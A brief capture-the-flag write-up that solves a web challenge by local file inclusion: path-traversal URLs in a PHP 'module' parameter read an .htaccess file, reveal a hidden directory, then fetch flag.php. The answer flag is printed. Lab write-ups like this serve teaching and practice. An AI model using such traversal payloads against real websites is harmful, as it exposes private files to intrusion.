Since his students never know what date it is and how much time they have until the next homework's deadline, Mr P. H. Porter wrote a little webapp for that.
You can find it [here](http://school.fluxfingers.net:1522/).

We see `https://school.fluxfingers.net:1522/?module=date`

Try [Local File Inclusion](https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/) in PHP, we have `https://school.fluxfingers.net:1522/?module=../.htaccess` and view source we see something interesting

	# needs to be hidden from direct access <!--
	# seems to be not working, though
	#<Directory "3cdcf3c63dc02f8e5c230943d9f1f4d75a4d88ae">
	#    Options -Indexes

Now we use LFI again with this link: `https://school.fluxfingers.net:1522/?module=../3cdcf3c63dc02f8e5c230943d9f1f4d75a4d88ae/flag.php`

Flag: `flag{hidden_is_not_actually_hidden}`
